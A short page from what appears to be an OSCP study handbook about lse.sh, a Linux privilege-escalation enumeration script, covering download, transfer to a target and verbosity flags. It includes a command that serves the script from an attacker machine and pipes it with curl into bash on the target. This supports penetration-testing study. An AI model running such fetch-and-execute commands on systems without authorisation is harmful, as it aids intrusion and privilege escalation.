---
title: "linux-smart-enumeration"
slug: linux-smart-enumeration
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-19T23:38:46+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "`lse.sh` (linux-smart-enumeration) enumerates a Linux host for privilege-escalation vectors, like [LinPEAS](/collections/oscp/linpeas) but quieter and ranked by verbosity level."
---
`lse.sh` (linux-smart-enumeration) enumerates a Linux host for privilege-escalation vectors, like [LinPEAS](/collections/oscp/linpeas) but quieter and ranked by verbosity level. It shows only the findings that matter at its default level and reveals more as the level rises, which keeps it readable over a raw shell where LinPEAS colour output turns to noise. Run it alongside the manual checks in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

## Install

```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -o lse.sh
chmod +x lse.sh
```

## Transfer to the Target

Serve from Kali, fetch on the target. Piping into a shell avoids writing to disk on a `noexec` mount.

```bash
# Kali
sudo python3 -m http.server 80
# target
curl http://KALI/lse.sh | bash
```

## Run

The `-l` level controls how much is shown:

```bash
./lse.sh            # -l0 default: only the findings that look exploitable
./lse.sh -l1        # + interesting findings with more context
./lse.sh -l2        # dump everything it gathered
```

Other useful flags:

- `-i`: non-interactive, does not prompt for the current user's password. Some checks such as `sudo -l` need it.
- `-c`: no colour, for shells that mangle escape codes.

Start at `-l0` for the strong leads, then `-l1` if it comes up short. Confirm anything it flags by hand before acting on it, and feed the result into the triage order in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).
